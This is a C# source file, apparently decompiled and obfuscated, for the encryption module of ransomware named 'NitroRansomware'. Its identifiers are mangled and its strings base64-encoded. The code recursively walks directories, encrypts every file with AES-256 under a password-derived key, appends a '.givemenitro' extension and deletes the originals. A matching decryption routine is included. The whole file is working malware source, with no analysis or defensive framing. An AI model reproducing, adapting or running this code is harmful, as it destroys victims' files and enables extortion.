using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace NitroRansomware;

internal class Crypto
{
	public static int UhmsSZzCGwxRbqzCwcFH難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = 0;

	private static Logs jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = new Logs(Encoding.UTF8.GetString(Convert.FromBase64String("REVCVUc=")), 0);

	private static string ftd4sdlJR3kFNqxPqQyr難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = Encoding.UTF8.GetString(Convert.FromBase64String("LmdpdmVtZW5pdHJv"));

	public static string N0zWQymheAXyc41p0WdQ難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = Program.YTTdOuWyaZqIoquX15LR難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化;

	public static string fCS9AbmewwHXzHYPuROt難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化;

	public static List<string> rD5QFl2iYHp4diMLHZWe難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = new List<string>();

	public static void LHlitAz5GLvJHjYb7B4O(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (!text.Contains(ftd4sdlJR3kFNqxPqQyr難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化))
				{
					jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Y9DSOZGOOOIsdaYv6ZxN(Encoding.UTF8.GetString(Convert.FromBase64String("RW5jcnlwdGluZzog")) + text);
					rD5QFl2iYHp4diMLHZWe難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Add(text);
					PiatE0N8BfTjeZ1L0Dc1(text, N0zWQymheAXyc41p0WdQ難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化);
				}
			}
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				LHlitAz5GLvJHjYb7B4O(path2);
			}
		}
		catch (Exception ex)
		{
			jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.cgZDU8hRT7h6BHd4APyg(ex.Message);
		}
	}

	public static void IDPoHdkQuNH4v9ijSnXF(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (mxcMMfWtTbdFvH5IrwaP(text))
				{
					jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Y9DSOZGOOOIsdaYv6ZxN(Encoding.UTF8.GetString(Convert.FromBase64String("RGVjcnlwdGluZzog")) + text);
					RrxT9C9nDarVMHpDWjIl(text, text.Substring(0, text.Length - ftd4sdlJR3kFNqxPqQyr難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Length), fCS9AbmewwHXzHYPuROt難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化);
				}
			}
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				IDPoHdkQuNH4v9ijSnXF(path2);
			}
		}
		catch (Exception ex)
		{
			jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.cgZDU8hRT7h6BHd4APyg(ex.Message);
		}
	}

	private static bool mxcMMfWtTbdFvH5IrwaP(string file)
	{
		if (file.Contains(ftd4sdlJR3kFNqxPqQyr難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化) && file.Substring(file.Length - ftd4sdlJR3kFNqxPqQyr難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Length, ftd4sdlJR3kFNqxPqQyr難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.Length) == ftd4sdlJR3kFNqxPqQyr難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化)
		{
			return true;
		}
		return false;
	}

	private static void PiatE0N8BfTjeZ1L0Dc1(string filePath, string password)
	{
		byte[] array = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		rNGCryptoServiceProvider.Dispose();
		FileStream fileStream = new FileStream(filePath + ftd4sdlJR3kFNqxPqQyr難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(filePath, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.cgZDU8hRT7h6BHd4APyg(ex.Message);
		}
		finally
		{
			jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.vextY2n0oLuaLVRqOzYp(Encoding.UTF8.GetString(Convert.FromBase64String("RW5jeXB0ZWQg")) + filePath);
			UhmsSZzCGwxRbqzCwcFH難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(filePath);
		}
	}

	private static void RrxT9C9nDarVMHpDWjIl(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.cgZDU8hRT7h6BHd4APyg(Encoding.UTF8.GetString(Convert.FromBase64String("Q3J5cHRvZ3JhcGhpY0V4Y2VwdGlvbiBlcnJvcjog")) + ex.Message);
		}
		catch (Exception ex2)
		{
			jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.cgZDU8hRT7h6BHd4APyg(ex2.Message);
		}
		try
		{
			cryptoStream.Close();
			jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.vextY2n0oLuaLVRqOzYp(Encoding.UTF8.GetString(Convert.FromBase64String("RGVjcnlwdGVkOiA=")) + inputFile);
		}
		catch (Exception ex3)
		{
			jEr5t0M9Ckgz5tMyeyzb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.cgZDU8hRT7h6BHd4APyg(Encoding.UTF8.GetString(Convert.FromBase64String("RXJyb3IgYnkgY2xvc2luZyBDcnlwdG9TdHJlYW06IA==")) + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}
}
